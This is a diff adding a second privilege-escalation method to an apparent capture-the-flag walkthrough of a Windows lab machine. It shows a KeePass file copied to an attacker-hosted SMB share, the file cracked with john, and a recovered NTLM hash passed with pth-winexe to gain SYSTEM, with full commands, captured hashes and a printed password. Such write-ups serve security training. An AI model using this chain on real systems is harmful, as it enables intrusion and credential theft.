@@ -227,6 +227,8 @@ PS C:\Users\kohsuke\Desktop> type user.txt
 
 ## Privilege Escalation
 
+### Method 1 (The hard way)
+
 Now, that we are on the machine and already have the user flag. We can do some enumeration to see what kind of system we are on and what privileges do we have.
 
 ```
@@ -389,6 +391,157 @@ PS C:\Windows\system32>
 
 And there we get access as `NT Authority\System`!
 
+### Method 2 (The Easy Way)
+
+After finding the user flag, we can take a look at other files present in the current user's directory to see if something interesting can be found.
+
+It can be seen that there is a file named `CEH.kdbx` in the `Documents` directory.
+
+``` 
+PS C:\Users\kohsuke\Documents> dir
+
+
+    Directory: C:\Users\kohsuke\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx
+```
+
+This is probably is a KeyPass database file, which can be cracked using `john`. But for that we need to move this file to our local system and one way of doing that is starting an FTP server on our machine to which we can connect from the target machine and upload the file there.
+
+We can start the server on our machine using `impacket-smbserver hacker .` and then on the target machine we can run the command `New-PSDrive -Name "hacker" -PSProvider "FileSystem" -Root "\\10.10.15.61\hacker"`.
+
+On the attacker server side the output would look something like
+```
+$ impacket-smbserver temp .
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.228.112,49678)
+[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
+[*] User JEEVES\kohsuke authenticated successfully
+[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:3521633c32f6f91a922aeab67c16392a:0101000000000000005ab4dc819dda01ac509b19c1c77ee000000000010010004700630047007300780051006b004600030010004700630047007300780051006b0046000200100042005a004a0078006a005600780042000400100042005a004a0078006a0056007800420007000800005ab4dc819dda010600040002000000080030003000000000000000000000000030000021dbb152481f10aee54604fad7d75e5038ea7b83070adf42f7d00abcd3f0650f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0036003100000000000000000000000000
+```
+
+Once the drive is attached, the file can be easily copied.
+
+```
+PS C:\Users\kohsuke> cd hacker:
+PS hacker:\> cp C:\Users\kohsuke\Documents\CEH.kdbx .
+```
+
+Right after that we can kill the server and see that the file is on the attacker machine
+
+```
+$ ls -la CEH.kdbx
+-rwxr-xr-x 1 root root 2846 Sep 18  2017 CEH.kdbx
+```
+
+To crack the kdbx file we need to first run it through `keepass2john` so that a hash can be generated that can be cracked with `john`. Then that hash can be passed to `john` for final cracking.
+
+```
+$ keepass2john CEH.kdbx > kdb.john
+$ john --wordlist=/usr/share/wordlists/rockyou.txt kdb.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:10 0.16% (ETA: 13:03:00) 0g/s 2763p/s 2763c/s 2763C/s tuffy..tayla
+moonshine1       (CEH)
+1g 0:00:00:20 DONE (2024-05-03 11:19) 0.04995g/s 2746p/s 2746c/s 2746C/s nando1..moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+With that we were able to crack the password for this kdbx file.
+
+Now, we can open this file using the CLI version of KeePass which is `kpcli`. 
+
+```
+$ kpcli --kdb=CEH.kdbx
+Provide the master password: *************************
+
+KeePass CLI (kpcli) v3.8.1 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help <command>' for details on individual commands.
+
+kpcli:/> ls
+=== Groups ===
+CEH/
+kpcli:/> cd CEH
+kpcli:/CEH> ls
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Windows/
+=== Entries ===
+0. Backup stuff
+1. Bank of America                                   www.bankofamerica.com
+2. DC Recovery PW
+3. EC-Council                               www.eccouncil.org/programs/cer
+4. It's a secret                                 localhost:8180/secret.jsp
+5. Jenkins admin                                            localhost:8080
+6. Keys to the kingdom
+7. Walmart.com                                             www.walmart.com
+kpcli:/CEH> show -f 4
+
+Title: It's a secret
+Uname: admin
+ Pass: F7WhTrSFDKB6sxHU1cUn
+  URL: http://localhost:8180/secret.jsp
+Notes:
+kpcli:/CEH> show -f 0
+
+Title: Backup stuff
+Uname: ?
+ Pass: aa****************************4ee:e0****************************e00
+  URL:
+Notes:
+```
+
+That does not look like a password but more like a hash, so we can use a tool like `pth-winexe` to gain access to the target machine as administrator.
+
+```
+$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.129.228.112 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+jeeves\administrator
+```
+
+Here, we logged in as the administrator but we can even login as system by adding the flag `--system` to our command.
+
+```
+$ pth-winexe -U Administrator%aa****************************4ee:e0****************************e00 --system //10.129.228.112 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+And with that we escalated our privilege to SYSTEM level!
+
 ## Key Points to Take Away
 
 1. If there is a vulnerability that you are sure about, keep trying different ways to exploit it.
@@ -401,4 +554,5 @@ And there we get access as `NT Authority\System`!
 3. [HackTricks: Privilege Escalation Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
 4. [Juicy Potato](https://github.com/ohpe/juicy-potato)
 5. [Nishang: Invoke-PowerShellTcp](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
+6. [New-PSDrive](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.4)
 
